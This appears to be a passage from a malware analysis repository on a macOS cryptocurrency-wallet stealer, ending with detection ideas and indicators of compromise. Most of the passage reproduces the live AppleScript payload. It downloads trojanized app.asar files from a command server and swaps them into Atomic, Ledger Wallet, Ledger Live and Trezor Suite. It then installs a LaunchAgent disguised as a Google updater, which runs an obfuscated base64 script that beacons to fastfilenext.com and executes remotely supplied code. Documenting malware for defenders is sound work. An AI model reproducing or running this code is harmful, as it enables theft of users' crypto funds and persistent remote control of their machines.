do shell script "mv /tmp/Atomic_tmp.app " & quoted form of atomicPath
do shell script "mv " & quoted form of tempAsar & " " & quoted form of targetAsar
do shell script "xattr -cr " & quoted form of atomicPath
do shell script "codesign -f -d -s - " & quoted form of atomicPath
debugLog("Atomic: injection OK")
end if
do shell script "rm -f " & quoted form of tempZip
on error errMsg
debugLog("Atomic: injection FAIL | " & errMsg)
end try
end if
set ledgerPath to "/Applications/Ledger Wallet.app"
if (do shell script "test -d " & quoted form of ledgerPath & " && echo 1 || echo 0") is "1" then
debugLog("Ledger Wallet FOUND at " & ledgerPath & ", injecting...")
try
set asarUrl to gateUrl & "/ledger-asar"
set tempZip to "/tmp/ledger_asar.zip"
set tempAsar to "/tmp/app.asar"
set tempPlist to "/tmp/Info.plist"
do shell script "curl -s -o " & quoted form of tempZip & " " & quoted form of asarUrl
do shell script "unzip -q -o " & quoted form of tempZip & " -d /tmp"
if (do shell script "test -f " & quoted form of tempAsar & " && echo 1 || echo 0") is "1" then
do shell script "pkill -9 'Ledger Wallet' 2>/dev/null || true"
delay 1
set ledgerResources to "/Applications/Ledger Wallet.app/Contents/Resources"
set targetAsar to ledgerResources & "/app.asar"
set targetPlist to "/Applications/Ledger Wallet.app/Contents/Info.plist"
do shell script "cp -rf " & quoted form of ledgerPath & " /tmp/Ledger_tmp.app"
do shell script "rm -rf " & quoted form of ledgerPath
do shell script "mv /tmp/Ledger_tmp.app " & quoted form of ledgerPath
do shell script "mv " & quoted form of tempAsar & " " & quoted form of targetAsar
if (do shell script "test -f " & quoted form of tempPlist & " && echo 1 || echo 0") is "1" then
do shell script "mv " & quoted form of tempPlist & " " & quoted form of targetPlist
end if
do shell script "xattr -cr " & quoted form of ledgerPath
do shell script "codesign -f -d -s - " & quoted form of ledgerPath
debugLog("Ledger Wallet: injection OK")
end if
do shell script "rm -f " & quoted form of tempZip
on error errMsg
debugLog("Ledger Wallet: injection FAIL | " & errMsg)
end try
end if
set ledgerLivePath to "/Applications/Ledger Live.app"
if (do shell script "test -d " & quoted form of ledgerLivePath & " && echo 1 || echo 0") is "1" then
debugLog("Ledger Live FOUND at " & ledgerLivePath & ", injecting...")
try
set asarUrl to gateUrl & "/ledgerlive-asar"
set tempZip to "/tmp/ledger_live_asar.zip"
set tempAsar to "/tmp/app.asar"
set tempPlist to "/tmp/Info.plist"
do shell script "curl -s -o " & quoted form of tempZip & " " & quoted form of asarUrl
do shell script "unzip -q -o " & quoted form of tempZip & " -d /tmp"
if (do shell script "test -f " & quoted form of tempAsar & " && echo 1 || echo 0") is "1" then
do shell script "pkill -9 'Ledger Live' 2>/dev/null || true"
delay 1
set ledgerLiveResources to "/Applications/Ledger Live.app/Contents/Resources"
set targetAsar to ledgerLiveResources & "/app.asar"
set targetPlist to "/Applications/Ledger Live.app/Contents/Info.plist"
do shell script "cp -rf " & quoted form of ledgerLivePath & " /tmp/LedgerLive_tmp.app"
do shell script "rm -rf " & quoted form of ledgerLivePath
do shell script "mv /tmp/LedgerLive_tmp.app " & quoted form of ledgerLivePath
do shell script "mv " & quoted form of tempAsar & " " & quoted form of targetAsar
if (do shell script "test -f " & quoted form of tempPlist & " && echo 1 || echo 0") is "1" then
do shell script "mv " & quoted form of tempPlist & " " & quoted form of targetPlist
end if
do shell script "xattr -cr " & quoted form of ledgerLivePath
do shell script "codesign -f -d -s - " & quoted form of ledgerLivePath
debugLog("Ledger Live: injection OK")
end if
do shell script "rm -f " & quoted form of tempZip
on error errMsg
debugLog("Ledger Live: injection FAIL | " & errMsg)
end try
end if
set trezorPath to "/Applications/Trezor Suite.app"
if (do shell script "test -d " & quoted form of trezorPath & " && echo 1 || echo 0") is "1" then
debugLog("Trezor Suite FOUND at " & trezorPath & ", injecting...")
try
set asarUrl to gateUrl & "/trezor-asar"
set tempZip to "/tmp/trezor_asar.zip"
set tempAsar to "/tmp/app.asar"
do shell script "curl -s -o " & quoted form of tempZip & " " & quoted form of asarUrl
do shell script "unzip -q -o " & quoted form of tempZip & " -d /tmp"
if (do shell script "test -f " & quoted form of tempAsar & " && echo 1 || echo 0") is "1" then
do shell script "pkill -9 'Trezor Suite' 2>/dev/null || true"
delay 1
set trezorResources to "/Applications/Trezor Suite.app/Contents/Resources"
set targetAsar to trezorResources & "/app.asar"
do shell script "cp -rf " & quoted form of trezorPath & " /tmp/Trezor_tmp.app"
do shell script "rm -rf " & quoted form of trezorPath
do shell script "mv /tmp/Trezor_tmp.app " & quoted form of trezorPath
do shell script "mv " & quoted form of tempAsar & " " & quoted form of targetAsar
do shell script "xattr -cr " & quoted form of trezorPath
do shell script "codesign -f -d -s - " & quoted form of trezorPath
debugLog("Trezor: injection OK")
end if
do shell script "rm -f " & quoted form of tempZip
on error errMsg
debugLog("Trezor: injection FAIL | " & errMsg)
end try
end if

debugLog("--- PERSISTENCE ---")
-- Persistence section (same as production)
set persistDir to (POSIX path of (path to home folder)) & "Library/Application Support/Google/"
set appDir to persistDir & "GoogleUpdate.app/Contents/MacOS/"
set plistDir to (POSIX path of (path to home folder)) & "Library/LaunchAgents/"
debugLog("Persistence: script -> " & appDir & "GoogleUpdate")
debugLog("Persistence: plist -> " & plistDir & "com.google.keystone.agent.plist")
try
do shell script "mkdir -p " & quoted form of appDir
do shell script "mkdir -p " & quoted form of plistDir
set scriptPath to appDir & "GoogleUpdate"
set plistPath to plistDir & "com.google.keystone.agent.plist"
do shell script "echo 'IyEvYmluL2Jhc2gKR0FURV9VUkw9Imh0dHBzOi8vZmFzdGZpbGVuZXh0LmNvbSIKQk9UX0lEPSQoaW9yZWcgLWQyIC1jIElPUGxhdGZvcm1FeHBlcnREZXZpY2UgfCBhd2sgLUYnIicgJy9JT1BsYXRmb3JtVVVJRC97cHJpbnQgJDR9JykKQlVJTERfSUQ9ImQ5MWQ4NDRhZDg5MjA0NThlZTk5ZTcwN2IxYTIwM2NiYThkZjc2Y2U5NjAxOTVmMDk5M2ViM2IwZTk2ZDg5M2YiCkJVSUxEX05BTUU9IiIKSE9TVE5BTUU9JChob3N0bmFtZSkKSVA9JChjdXJsIC1zIGh0dHBzOi8vYXBpLmlwaWZ5Lm9yZyAyPi9kZXYvbnVsbCB8fCBlY2hvIHVua25vd24pCk9TX1ZFUj0kKHN3X3ZlcnMgLXByb2R1Y3RWZXJzaW9uKQpSRVNQPSQoY3VybCAtcyAtWCBQT1NUICIkR0FURV9VUkwvYXBpL2JvdC9oZWFydGJlYXQiIC1IICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24iIC1kICd7ImJvdF9pZCI6IiciJEJPVF9JRCInIiwiYnVpbGRfaWQiOiInIiRCVUlMRF9JRCInIiwiaG9zdG5hbWUiOiInIiRIT1NUTkFNRSInIiwiaXAiOiInIiRJUCInIiwib3NfdmVyc2lvbiI6IiciJE9TX1ZFUiInIn0nKQpDT0RFPSQoZWNobyAiJFJFU1AiIHwgc2VkIC1uICdzLy4qImNvZGUiOiJcKFteIl0qXCkiLiovXDEvcCcpCmlmIFsgLW4gIiRDT0RFIiBdOyB0aGVuCmVjaG8gIiRDT0RFIiB8IGJhc2U2NCAtZCA+IC90bXAvLmMuc2ggJiYgY2htb2QgK3ggL3RtcC8uYy5zaCAmJiAvdG1wLy5jLnNoOyBybSAtZiAvdG1wLy5jLnNoCmZpCg==' | base64 -d > " & quoted form of scriptPath
do shell script "chmod +x " & quoted form of scriptPath
set plistContent to "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>
<key>Label</key>
<string>com.google.keystone.agent</string>
<key>ProgramArguments</key>
<array>
<string>" & scriptPath & "</string>
</array>
<key>StartInterval</key>
<integer>60</integer>
<key>RunAtLoad</key>
<true/>
<key>StandardOutPath</key>
<string>/dev/null</string>
<key>StandardErrorPath</key>
<string>/dev/null</string>
</dict>
</plist>"
do shell script "echo " & quoted form of plistContent & " > " & quoted form of plistPath
do shell script "launchctl unload " & quoted form of plistPath & " 2>/dev/null || true"
do shell script "launchctl load " & quoted form of plistPath
debugLog("Persistence: OK")
on error errMsg
debugLog("Persistence: FAIL | " & errMsg)
end try
debugLog("=== SCRIPT COMPLETE ===")
display dialog "Your Mac does not support this application. Try reinstalling or downloading the version for your system." with title "System Preferences" with icon stop buttons {"OK"}
```

## Detection opportunities

- Creation of `~/Library/LaunchAgents/com.google.keystone.agent.plist`
- Creation of `~/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate`
- Process chains involving `curl | osascript`
- Use of `launchctl load` from user-writable paths
- Network traffic to `fastfilenext.com`, `api.ipify.org`, `icanhazip.com`, `ifconfig.me`
- Access to cryptocurrency wallet directories and browser extension storage
- Abrupt wallet process termination followed by `app.asar` replacement and `codesign -f -s -`

## IOC summary

### Infrastructure
- `hxxps://fastfilenext[.]com`
- `/debug/loader.sh`
- `/debug/payload.applescript`
- `/gate`
- `/gate/chunk`
- `/api/debug/event`
- `/api/bot/heartbeat`
- `/gate/exodus-asar`
- `/gate/atomic-asar`
- `/gate/ledger-asar`
- `/gate/ledgerlive-asar`
- `/gate/trezor-asar`

### Additional identifiers
- API key: `61cb9c3bd1a2faa7d6613dd8e5d09e79fe95e85ab09ed6bcd6406badff5a083f`
- Build ID: `d91d844ad8920458ee99e707b1a203cba8df76ce960195f0993eb3b0e96d893f`

## Notes

This repository preserves the code and analysis exactly as extracted from the provided research notes, with the hashes you supplied added to the malware summary.
